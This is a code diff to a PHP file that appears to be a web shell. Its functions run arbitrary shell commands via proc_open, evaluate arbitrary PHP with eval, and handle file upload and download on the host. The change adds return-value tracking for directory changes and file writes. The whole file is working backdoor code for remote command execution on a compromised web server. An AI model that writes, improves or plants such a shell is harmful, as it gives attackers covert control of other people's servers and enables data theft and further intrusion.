@@ -6,19 +6,21 @@ function featureShell($cmd, $cwd) {
         $disable_functions = array_flip(array_map('strtolower', array_map('trim', explode(',', trim(ini_get('disable_functions'))))));
     }
     $stdout = array();
+    $changed = null;
 
     if (preg_match("/^\s*cd\s*$/", $cmd)) {
         // pass
     } elseif (preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $cmd)) {
-        chdir($cwd);
+        $changed = [];
+        $changed[] = chdir($cwd);
         preg_match("/^\s*cd\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
-        chdir($match[1]);
+        $changed[] = chdir($match[1]);
     } elseif (preg_match("/^\s*download\s+[^\s]+\s*(2>&1)?$/", $cmd)) {
-        chdir($cwd);
+        $changed = chdir($cwd);
         preg_match("/^\s*download\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
         return featureDownload($match[1]);
     } else {
-        chdir($cwd);
+        $changed = chdir($cwd);
         if (function_exists('proc_open') && is_callable('proc_open') && !isset($disable_functions['proc_open'])) {
             $descriptorspec = [
                 1 => ['pipe', 'w'],
@@ -54,7 +56,8 @@ function featureShell($cmd, $cwd) {
 
     return array(
         "stdout" => $stdout,
-        "cwd" => getcwd()
+        "cwd" => getcwd(),
+        "changed" => $changed,
     );
 }
 
@@ -129,30 +132,40 @@ function featureUpload($path, $file, $cwd) {
             'cwd' => getcwd()
         );
     } else {
-        fwrite($f, base64_decode($file));
-        fclose($f);
+        $writed = null;
+        if (is_resource($f)) {
+            $writed = fwrite($f, base64_decode($file));
+        }
+        $closed = null;
+        if (is_resource($f)) {
+            $closed = fclose($f);
+        }
         return array(
             'stdout' => array('Done.'),
-            'cwd' => getcwd()
+            'cwd' => getcwd(),
+            'writed' => $writed,
+            'closed' => $closed,
         );
     }
 }
 
 function featureEval($code, $cwd) {
     $stdout = array();
+    $changed = null;
 
     if (preg_match("/^\s*cd\s*$/", $code)) {
         // pass
     } elseif (preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $code)) {
-        chdir($cwd);
+        $changed = [];
+        $changed[] = chdir($cwd);
         preg_match("/^\s*cd\s+([^\s]+)\s*(2>&1)?$/", $code, $match);
-        chdir($match[1]);
+        $changed[] = chdir($match[1]);
     } elseif (preg_match("/^\s*download\s+[^\s]+\s*(2>&1)?$/", $code)) {
-        chdir($cwd);
+        $changed = chdir($cwd);
         preg_match("/^\s*download\s+([^\s]+)\s*(2>&1)?$/", $code, $match);
         return featureDownload($match[1]);
     } else {
-        chdir($cwd);
+        $changed = chdir($cwd);
         ob_start();
         eval($code);
         $stdout = ob_get_clean();
@@ -163,7 +176,8 @@ function featureEval($code, $cwd) {
 
     return array(
         "stdout" => $stdout,
-        "cwd" => getcwd()
+        "cwd" => getcwd(),
+        "changed" => $changed,
     );
 }
 
